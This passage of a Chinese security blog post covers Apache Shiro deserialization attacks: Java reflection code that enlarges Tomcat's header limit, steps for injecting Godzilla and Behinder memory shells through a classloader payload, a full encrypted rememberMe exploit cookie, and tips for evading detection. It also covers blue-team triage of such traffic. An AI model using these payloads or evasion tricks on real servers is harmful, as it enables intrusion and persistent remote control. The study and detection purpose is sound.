getHandlerMethod.setAccessible(true);</span><br><span class="line">            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =</span><br><span class="line">                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());</span><br><span class="line">            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br><span class="line">            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();</span><br><span class="line">            for (int i = 0; i &lt; connectors.length; i++) &#123;</span><br><span class="line">                if (4 == connectors[i].getScheme().length()) &#123;</span><br><span class="line">                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();</span><br><span class="line">                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) &#123;</span><br><span class="line">                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();</span><br><span class="line">                        for (int j = 0; j &lt; classes.length; j++) &#123;</span><br><span class="line">                            // org.apache.coyote.AbstractProtocol$ConnectionHandler</span><br><span class="line">                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) &#123;</span><br><span class="line">                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(&quot;global&quot;);</span><br><span class="line">                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(&quot;processors&quot;);</span><br><span class="line">                                globalField.setAccessible(true);</span><br><span class="line">                                processorsField.setAccessible(true);</span><br><span class="line">                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));</span><br><span class="line">                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line">                                for (int k = 0; k &lt; list.size(); k++) &#123;</span><br><span class="line">                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));</span><br><span class="line">                                    // 10000000 为修改后的 headersize</span><br><span class="line">                                    headerSizeField.set(tempRequest.getInputBuffer(),10000000);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        // 10000000 为修改后的 headersize</span><br><span class="line">                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(10000000);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>  然后再client1文件上我们把他改成修改headsize的文件处，这里是通过javaasist把他转换成字节码之后又塞进了CB链的TemplateImpl的对象当中，再通过shiro下面的格式转换。那其实后面打内存马也是这一样的操作。主要把内存马恶意类转换成字节码再通过封装TemplateImpl即可。 我们拿到payload直接发包</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421165841656.png" class="" title="image-20260421165841656">
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421170304875.png" class="" title="image-20260421170304875">
+
+<p>然后再打内存马的payload，发现已经没问题了。我这里打的哥斯拉的，拿哥斯拉连。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421170319321.png" class="" title="image-20260421170319321">
+
+<p>我们连接的时候，往下翻java-chain的模块，有对应的连接参数，这里面一定要认真填！</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421170557480.png" class="" title="image-20260421170557480">
+
+<p>那我们这里就连上来了。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421170642625.png" class="" title="image-20260421170642625">
+
+<p>  上面那个shiro attack就不说了。这里做一个总结：反射修改虽然说能解决打内存马的问题，但是这个局限性特别大。比如说tomcat6789的版本都不完全适配，而且构造出来的本身都已经比较长了。这里不是很通用。</p>
+<h5 id="打loader加载字节码"><a href="#打loader加载字节码" class="headerlink" title="打loader加载字节码"></a>打loader加载字节码</h5><p>  ⽤反序列化加载⼀个类加载器ClassLoader 将进来的代码动态加载执⾏。打进去的loader payload去加载里面的字节码从而攻击。可以学习参考<a target="_blank" rel="noopener" href="https://github.com/yyhuni/shiroMemshell">https://github.com/yyhuni/shiroMemshell</a> 这里是怎么做到的。</p>
+<p>  它的classloader总体做的事如图总结，我们怎么使用呢？在clinet1文件当中改成这样，执行之后把值复制到Cookies上。然后再请求体当中以这样的格式来执行：classData&#x3D;base64之后的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────────────────┐</span><br><span class="line">│  Shiro RememberMe Cookie (AES加密+Base64编码的恶意序列化数据)   │</span><br><span class="line">│                    ↓ 反序列化触发                              │</span><br><span class="line">│  ClassDataLoader (继承 AbstractTranslet，利用 TemplatesImpl 链) │</span><br><span class="line">│                    ↓ 构造函数自动执行                           │</span><br><span class="line">│  遍历 Tomcat HTTP 线程 → 获取 Request 对象 → 提取 classData 参数 │</span><br><span class="line">│                    ↓                                          │</span><br><span class="line">│  Base64解码 → defineClass 动态定义类 → newInstance 实例化执行   │</span><br><span class="line">└─────────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421214400302.png" class="" title="image-20260421214400302">
+
+<p>  那classData的值该怎么生成呢？这里我们把恶意类放到kali里，执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -w 0 calcxlan.class       //为了不自动换行</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421214823314.png" class="" title="image-20260421214823314">
+
+<p>  这个值复制下来直接放到classData处，这里的class就是一个弹计算器的案例类。你也可以把把内存马的恶意类经过这么处理之后放入这个参数也就能打内存马了。这里base64的值你可以经过base64 url处理也可以不处理都能执行。但是最好经过base64 url编码，待会我会说为什么。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421214912450.png" class="" title="image-20260421214912450">
+
+<p>那我们java-chains也有这个模块，在这里有三个。但是我使用第二个才成功。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421231608179.png" class="" title="image-20260421231608179">
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421231656150.png" class="" title="image-20260421231656150">
+
+<p>  注意为了减少特征, 字节码中的 yv66vg 头部已在程序中指定, 在请求参数中携带字节码请求时需要去除这部分字符串, 并且需要对base64字符串进行url编码。这里的话跟JAVA CLASS头部结构有关，这是<strong>Java Class 文件的固定魔数 (Magic Number)</strong>。跟PE魔术头类似。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 原始字节 (Class 文件前 8 字节)</span><br><span class="line">0xCA 0xFE 0xBA 0xBE  0x00 0x00  0x00 0x34</span><br><span class="line">#   ↓ Base64 编码</span><br><span class="line"># 0xCAFE = 11001010 11111110 → &quot;yv&quot;</span><br><span class="line"># 0xBABE = 10111010 10111110 → &quot;66&quot;</span><br><span class="line"># 0x0000 = 00000000 00000000 → &quot;vg&quot;</span><br><span class="line"># 0x0034 = 00000000 00110100 → &quot;AA&quot;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>二进制</th>
+<th>十进制</th>
+<th>Base64 字符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>110010</code></td>
+<td>50</td>
+<td><code>y</code></td>
+</tr>
+<tr>
+<td><code>101110</code></td>
+<td>46</td>
+<td><code>v</code></td>
+</tr>
+<tr>
+<td><code>101010</code></td>
+<td>42</td>
+<td><code>6</code></td>
+</tr>
+<tr>
+<td><code>111110</code></td>
+<td>62</td>
+<td><code>+</code> → 但这里看实际分组</td>
+</tr>
+</tbody></table>
+<p>  所以它这里最好建议使用url编码减少特征。</p>
+<p>生成的payload我们放在Cookies中，然后我们是自己自定义字节码来攻击。放在data参数下，跟上面利用一模一样的。</p>
+<p>这里我打入behinder内存马。这里再项目中使用behinder的内存马进行生成，这里都要继承</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421233239202.png" class="" title="image-20260421233239202">
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421232211305.png" class="" title="image-20260421232211305">
+
+<p>如图所示，利用成功。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421231459084.png" class="" title="image-20260421231459084">
+
+<p>  也可以到那个Shiro attack进行一键化利用。它那个二开是用了分块传输做切割来减少payload的。</p>
+<h3 id="研判分析"><a href="#研判分析" class="headerlink" title="研判分析"></a>研判分析</h3><p>  我们接下来介绍两款优秀的工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/abc123info/BlueTeamTools/releases/tag/v3.58</span><br><span class="line">https://github.com/HotBoy-java/PotatoTool/</span><br></pre></td></tr></table></figure>
+
+<p>我们对Shiro attack这类工具进行分析。首先我们左上角抓包拿到它的payload进行抓包分析。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422004601124.png" class="" title="image-20260422004601124">
+
+<p>  我们前面了解到这款工具，它验证是否是Shiro框架，<strong>直接是rememberme&#x3D;yes的。这里可以作为这款工具的特征</strong>。这里不再抓包，上文分析。还有当使用Shiro attack的回显链功能的时候，这款工具是固定的请求头<strong>X-C</strong>。那凡是看到这个请求头，请求头下又有如同base64编码呢么基本确定是用了这款工具的回显功能。（实际抓包没抓到还是分析把）这里抓的回显链的包有几个共性基本上也可以确定了是恶意的。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422012743782.png" class="" title="image-20260422012743782">
+
+<p>执行的命令会给$$$包裹，去掉解码就能看到了。也不算什么混淆把！</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422012822367.png" class="" title="image-20260422012822367">
+
+
+
+<p>  我们对他的检测利用链进行抓包看看。这里以CB链183为案例进行抓包，我们点击检测利用链抓到payload如下，这就是它的cookies头，我们直接复制在这个两款工具上分析。我们主要看反编译的代码里<strong>有没有敏感的命令执行函数和其他敏感信息，其他都不需要看也没有必要。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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;</span><br></pre></td></tr></table></figure>
+
+<p>我们再PotatoTool这里查看</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422005821102.png" class="" title="image-20260422005821102">
+
+<p>我们看到命令执行函数：Runtime.getRuntime().exec</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422010020266.png" class="" title="image-20260422010020266">
+
+<p>另一款ABC123的蓝队工具箱，我们解密一下看看，可以看到格式是比较不友好的。但是我们分析也不需要太在意这个。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422010215553.png" class="" title="image-20260422010215553">
+
+<p>可以看到这里，我指向的这些箭头，还有关键字TemplatesImpl等，都代表了这payload打的是CB链。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422010530815.png" class="" title="image-20260422010530815">
+
+<p>这里也看到了RUNTIME这些方法，基本可以证明是恶意的</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422010724825.png" class="" title="image-20260422010724825">
+
+<p>   因为CB链是shiro自带的，有些环境Shiro带cc链有些情况是没有的。所以攻击者一般都会拿CB链来打，所以关键的信息需要知道，最起码你要手写过CB链和CC链。如果你写过肯定对这些特定的函数会比较敏感。下面拿java-chains去生成一个比较冷门的执行链。如果他不用TemplatesImpl来做执行用别的我们就关注这个Comparator这块。</p>
+<p>   可以看到CaseInsensitiveComparator这个玩意我们之前就讲过，再原生的CB链不依赖CC链给出的一个可行性得类：CaseInsensitiveComparator。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422011446954.png" class="" title="image-20260422011446954">
+
+<p>  这个工具竟然还有提示。当攻击者用分块传输什么的时候，反编译的代码就很少，那这个时候多关注这个内部结构分析这块。实在不懂得话可以全部复制给AI也行。<strong>冷门的链需要多看看java-chains生成的payload</strong>。有时候它不一定拿TemplatesImpl去套的。所以可以适当关注。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422011659140.png" class="" title="image-20260422011659140">
+
+<h3 id="规避分析混淆"><a href="#规避分析混淆" class="headerlink" title="规避分析混淆"></a>规避分析混淆</h3><p>  混淆的话j使用java-chains的混淆模块规避，Shiro attack没有这么强有力的混淆。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422020044986.png" class="" title="image-20260422020044986">
+
+<p>可以看到是可以执行命令的。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422020113668.png" class="" title="image-20260422020113668">
+
+<p>​    两款工具在这个混淆下基本上很无力，反正人工分析的话这种肯定不是正常业务你管他干了什么。但是骗过安全设备就很麻烦。更深入一点的话就需要靠RASP这些安全工具去hook对应的敏感类了。RASP会深入 JVM 运行时，监控解密+反序列化+行为。MemShellParty的作者就是写RASP的，特别厉害。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422020256063.png" class="" title="image-20260422020256063">
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260422020324233.png" class="" title="image-20260422020324233">
+
+
+
+<p>学习推荐：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/</span><br><span class="line">https://xz.aliyun.com/news/18697</span><br><span class="line">https://www.cnblogs.com/yyhuni/p/shiroMemshell.html#%E6%9E%84%E9%80%A0behinderfilterjava</span><br><span class="line">https://xz.aliyun.com/news/16970</span><br><span class="line">https://www.cnblogs.com/1vxyz/p/17588722.html</span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://wenfenhui.github.io">wenfenhui</a>
+            <p>原文链接：<a href="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a>
+            <p>发表日期：<a href="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">April 21st 2026, 6:20:45 pm</a>
+            <p>更新日期：<a href="https://wenfenhui.github.io/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">April 22nd 2026, 2:20:45 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2026/04/17/PE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/" title="PE结构学习">
